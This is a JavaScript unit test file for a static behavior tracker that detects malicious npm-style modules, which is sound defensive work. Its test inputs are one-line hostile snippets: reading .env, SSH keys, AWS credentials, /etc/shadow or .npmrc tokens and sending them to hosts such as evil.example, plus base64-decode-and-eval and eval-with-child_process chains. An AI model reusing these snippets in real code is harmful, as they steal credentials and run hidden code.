// packages/fw-agent/test/behavior-tracker-unit-test.js
// Direct unit + attack-vector tests for src/behavior-tracker.js.
// The 265-line behavioral core previously had NO dedicated test (only indirect coverage via
// detector/adversarial). This exercises every rule, every signal category, the scanSrc
// normalization (comments / require+import specifiers / URLs / template literals), and the
// true-negative cases that F-16/F-28/F-30 exist to protect.
const assert = require('assert');
const { BehaviorTracker } = require('../src/behavior-tracker');

let passed = 0;
function test(name, fn) {
  const bt = new BehaviorTracker();
  try {
    fn(bt);
    console.log('  ✓ ' + name);
    passed++;
  } catch (e) {
    console.error('  ✗ ' + name + '\n    ' + e.message);
    process.exit(1);
  }
}

// helper: does analyzeModule report a rule with the given name?
function ruleOf(violations, rule) {
  return violations.find((v) => v.rule === rule);
}
function hasBlock(violations) {
  return violations.some((v) => v.severity === 'CRITICAL' || v.severity === 'HIGH');
}

// ─── CREDENTIAL_EXFILTRATION (sensitive path + egress) ────────────────────────
test('CREDENTIAL_EXFILTRATION: .env read + network egress → CRITICAL', (bt) => {
  const v = bt.analyzeModule('steal.js', `const s = fs.readFileSync('.env'); https.get('http://x/?d=' + s);`);
  const r = ruleOf(v, 'CREDENTIAL_EXFILTRATION');
  assert.ok(r && r.severity === 'CRITICAL', 'expected CRITICAL CREDENTIAL_EXFILTRATION');
});

test('CREDENTIAL_EXFILTRATION: id_rsa / .ssh / .aws paths trigger', (bt) => {
  for (const p of ["'/home/u/.ssh/id_rsa'", "'/root/.aws/credentials'", "'/etc/shadow'"]) {
    bt.reset();
    const v = bt.analyzeModule('m.js', `const s = fs.readFileSync(${p}); fetch('http://x/'+s);`);
    assert.ok(ruleOf(v, 'CREDENTIAL_EXFILTRATION'), 'expected exfil for ' + p);
  }
});

test('No exfil when sensitive path present but NO network egress', (bt) => {
  const v = bt.analyzeModule('read.js', `const s = fs.readFileSync('.env'); module.exports = s.length;`);
  assert.ok(!hasBlock(v), 'reading .env without egress must not hard-block');
});

// ─── ENV_NETWORK_EGRESS (F-16 true negative) ─────────────────────────────────
test('ENV_NETWORK_EGRESS: process.env + egress → WARN only (not block)', (bt) => {
  const v = bt.analyzeModule('sdk.js', `const k = process.env.API_KEY; https.get('http://a/?k=' + k);`);
  const r = ruleOf(v, 'ENV_NETWORK_EGRESS');
  assert.ok(r && r.severity === 'WARN', 'env+egress should be WARN');
  assert.ok(!hasBlock(v), 'env+egress must never hard-block (F-16)');
});

test('process.env.FOO property access is NOT treated as a .env file path (F-16)', (bt) => {
  const v = bt.analyzeModule('cfg.js', `const port = process.env.PORT; https.get('http://a/' + port);`);
  assert.ok(!ruleOf(v, 'CREDENTIAL_EXFILTRATION'), 'process.env.X must not match SENSITIVE_PATH');
});

// ─── DYNAMIC_CODE_EXEC_CHAIN ─────────────────────────────────────────────────
test('DYNAMIC_CODE_EXEC_CHAIN: eval + child_process → CRITICAL', (bt) => {
  const v = bt.analyzeModule('rce.js', `eval(x); require('child_process').exec(y);`);
  const r = ruleOf(v, 'DYNAMIC_CODE_EXEC_CHAIN');
  assert.ok(r && r.severity === 'CRITICAL', 'expected CRITICAL exec chain');
});

// ─── OBFUSCATED_CODE_EXECUTION (F-31, the closed gap) ────────────────────────
test('OBFUSCATED_CODE_EXECUTION: Buffer.from base64 + eval → HIGH', (bt) => {
  const v = bt.analyzeModule('obf.js', `const p = Buffer.from('eA==','base64').toString(); eval(p);`);
  const r = ruleOf(v, 'OBFUSCATED_CODE_EXECUTION');
  assert.ok(r && r.severity === 'HIGH', 'expected HIGH OBFUSCATED_CODE_EXECUTION');
});

test('OBFUSCATED_CODE_EXECUTION: atob + new Function → HIGH', (bt) => {
  const v = bt.analyzeModule('obf2.js', `const c = atob(blob); new Function(c)();`);
  assert.ok(ruleOf(v, 'OBFUSCATED_CODE_EXECUTION'), 'expected atob+Function to trigger');
});

test('OBFUSCATED_CODE_EXECUTION: hex decode + eval → HIGH', (bt) => {
  const v = bt.analyzeModule('obf3.js', `const p = Buffer.from(h,'hex').toString(); eval(p);`);
  assert.ok(ruleOf(v, 'OBFUSCATED_CODE_EXECUTION'), 'expected hex decode + eval to trigger');
});

test('F-31 guard: decode WITHOUT eval does not block (JWT/HTTP libs)', (bt) => {
  const v = bt.analyzeModule('jwt.js', `const raw = Buffer.from(tok,'base64').toString('utf8'); module.exports = JSON.parse(raw);`);
  assert.ok(!hasBlock(v), 'decode-only must not block');
});

test('F-31 guard: eval WITHOUT decode does not block (build tools)', (bt) => {
  const v = bt.analyzeModule('build.js', `module.exports = eval('1 + 2');`);
  assert.ok(!hasBlock(v), 'eval-only must not block');
});

test('F-31 guard: bare Buffer.from (no encoding) + eval does not block', (bt) => {
  const v = bt.analyzeModule('copy.js', `const b = Buffer.from(arr); eval('1'); module.exports = b;`);
  assert.ok(!ruleOf(v, 'OBFUSCATED_CODE_EXECUTION'), 'Buffer.from without base64/hex is a byte copy, not a decode');
});

test('F-31 guard: decode named only in a COMMENT + real eval does not block', (bt) => {
  const v = bt.analyzeModule('cmt.js', `// Buffer.from(x, 'base64') would decode it\nmodule.exports = eval('40 + 2');`);
  assert.ok(!ruleOf(v, 'OBFUSCATED_CODE_EXECUTION'), 'comment-only decode must not manufacture the signal');
});

// ─── DYNAMIC_MODULE_LOAD (MEDIUM) ────────────────────────────────────────────
test('DYNAMIC_MODULE_LOAD: require(variable) → MEDIUM (never hard-block)', (bt) => {
  const v = bt.analyzeModule('dyn.js', `const name = getName(); const m = require(name);`);
  const r = ruleOf(v, 'DYNAMIC_MODULE_LOAD');
  assert.ok(r && r.severity === 'MEDIUM', 'expected MEDIUM DYNAMIC_MODULE_LOAD');
  assert.ok(!hasBlock(v), 'dynamic require must not be CRITICAL/HIGH');
});

// ─── .npmrc escalation matrix (F-30 redo) ────────────────────────────────────
test('.npmrc read + egress to hardcoded non-registry host → CRITICAL', (bt) => {
  const v = bt.analyzeModule('npmrc1.js', `const t = fs.readFileSync('.npmrc','utf8'); fetch('http://evil.example/c?d=' + t);`);
  assert.ok(ruleOf(v, 'CREDENTIAL_EXFILTRATION'), 'whole-file .npmrc exfil to evil host should be CRITICAL');
});

test('.npmrc read + _authToken field reference + egress → CRITICAL', (bt) => {
  const v = bt.analyzeModule('npmrc2.js', `const c = fs.readFileSync('.npmrc','utf8'); const t = c.match(/_authToken=(.+)/)[1]; https.request({host:'h'});`);
  assert.ok(ruleOf(v, 'CREDENTIAL_EXFILTRATION'), 'token field + host override should be CRITICAL');
});

test('.npmrc read + egress built from config (legit tooling) → WARN not block', (bt) => {
  const v = bt.analyzeModule('npmrc3.js', "const cfg = fs.readFileSync('.npmrc','utf8'); const registry = cfg.match(/registry=(.+)/)[1]; fetch(`${registry}/pkg`);");
  assert.ok(!hasBlock(v), 'config-built URL from .npmrc must not hard-block (F-30)');
  assert.ok(ruleOf(v, 'NPMRC_NETWORK_EGRESS'), 'should surface as NPMRC_NETWORK_EGRESS WARN');
});

test('.npmrc read + hardcoded fetch of real registry.npmjs.org → WARN not block', (bt) => {
  const v = bt.analyzeModule('npmrc4.js', `fs.readFileSync('.npmrc'); fetch('https://registry.npmjs.org/pkg');`);
  assert.ok(!hasBlock(v), 'hardcoded real-registry fetch softens to WARN (F-30)');
});

// ─── scanSrc normalization (F-27b / F-28) ────────────────────────────────────
test('Chained one-line require("fs").readFileSync(".env") + egress → blocks (F-27b)', (bt) => {
  const v = bt.analyzeModule('chain.js', `const s = require('fs').readFileSync('.env'); https.get('http://x/'+s);`);
  assert.ok(ruleOf(v, 'CREDENTIAL_EXFILTRATION'), 'one-line chained credential read must still block');
});

test('Sensitive path mentioned only in a comment + egress → clean (F-28)', (bt) => {
  const v = bt.analyzeModule('cmt2.js', `// reads src/auth/credentials.ts at build\nhttps.get('http://api.example.com/health');`);
  assert.ok(!hasBlock(v), 'a path-shaped string in a comment must not false-positive');
});

test('Import specifier containing "credentials" is not a filesystem read (F-27b)', (bt) => {
  const v = bt.analyzeModule('imp.js', `const c = require('@corp/credentials'); https.get('http://api.example.com/');`);
  assert.ok(!ruleOf(v, 'CREDENTIAL_EXFILTRATION'), 'module specifier must be blanked before SENSITIVE_PATH');
});

test('URL path segment resembling a secret is stripped before matching', (bt) => {
  const v = bt.analyzeModule('url.js', `fetch('https://api.example.com/v1/totpSecret'); const x = fs.readFileSync(cfg);`);
  assert.ok(!ruleOf(v, 'CREDENTIAL_EXFILTRATION'), 'URL path must be stripped from scanSrc');
});

// ─── NETWORK_EGRESS variants incl. inline require (F-08) ──────────────────────
test('Inline require("https").get + .env read → blocks (F-08 egress regex)', (bt) => {
  const v = bt.analyzeModule('inline.js', `const s = fs.readFileSync('.env'); require('https').get('http://x/?d='+s);`);
  assert.ok(ruleOf(v, 'CREDENTIAL_EXFILTRATION'), 'inline require egress must be recognized');
});

test('fetch / net.createConnection / WebSocket all count as egress', (bt) => {
  for (const call of ["fetch('http://x/'+s)", "net.createConnection(1,'h')", "new WebSocket('ws://x')", "tls.connect(1,'h')"]) {
    bt.reset();
    const v = bt.analyzeModule('m.js', `const s = fs.readFileSync('.env'); ${call};`);
    assert.ok(ruleOf(v, 'CREDENTIAL_EXFILTRATION'), 'egress form should count: ' + call);
  }
});

// ─── small-module (F-07) + empty content edge cases ──────────────────────────
test('Sub-100-byte credential exfil still analyzed (F-07, no size skip)', (bt) => {
  const src = `fs.readFileSync('.env');fetch('http://x')`;
  assert.ok(src.length < 100);
  const v = bt.analyzeModule('tiny.js', src);
  assert.ok(ruleOf(v, 'CREDENTIAL_EXFILTRATION'), 'tiny module must still be scanned');
});

test('Empty / null content returns no violations', (bt) => {
  assert.deepStrictEqual(bt.analyzeModule('e.js', ''), []);
  assert.deepStrictEqual(bt.analyzeModule('e.js', null), []);
});

// ─── reset() clears state ────────────────────────────────────────────────────
test('reset() clears accumulated violations and signals', (bt) => {
  bt.analyzeModule('a.js', `fs.readFileSync('.env'); fetch('http://x');`);
  assert.ok(bt.violations.length > 0);
  bt.reset();
  assert.strictEqual(bt.violations.length, 0);
  assert.strictEqual(bt.moduleSignals.size, 0);
});

console.log(`\nAll behavior-tracker unit tests passed (${passed}).`);
